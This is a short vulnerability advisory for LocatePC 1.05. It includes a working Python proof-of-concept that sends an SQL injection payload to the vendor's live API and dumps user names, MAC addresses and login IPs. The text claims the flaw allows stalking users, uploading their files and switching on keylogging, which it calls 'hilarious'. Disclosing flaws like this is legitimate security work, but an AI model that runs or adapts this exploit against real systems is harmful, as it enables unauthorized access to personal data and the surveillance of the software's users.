#Affected Software:
#LocatePC 1.05

#Consequences:

#Arbitrary SELECT queries against the LocatePC and "mysql" database. 
#The LocatePC database contains enough information to stalk all 
#users of the software. It may be possible to instruct the software 
#to upload arbitrary files from each user's computer to the LocatePC 
#database, and then to later extract those files from the database.
#Activating the software's keylogging functionality is both possible 
#and hilarious.

#Proof of Concept:

#!/usr/bin/python
import httplib
import urllib
import xml.etree.ElementTree
h = httplib.HTTPSConnection('www.ligattsecurity.com')
p = '''<Request 
funcname="uName,mac_address,last_login_ip,program_login from user 
where LENGTH(last_login_ip) > 0;--"></Request>'''
h.request("POST","/locatePC/api/",p,{"ContentType":"application/x-
www-form-urlencoded"})
r = h.getresponse()
data = urllib.unquote_plus(r.read())
for i in xml.etree.ElementTree.fromstring(data).iter():
        if i.tag == "Row":
                print ""
        elif i.tag == "Cell" and i.text != None:
                print i.text


#Solution:
#DON'T USE LOCATEPC!!!

#References:
#- http://www.ligattsecurity.com/solutions/locate-pc
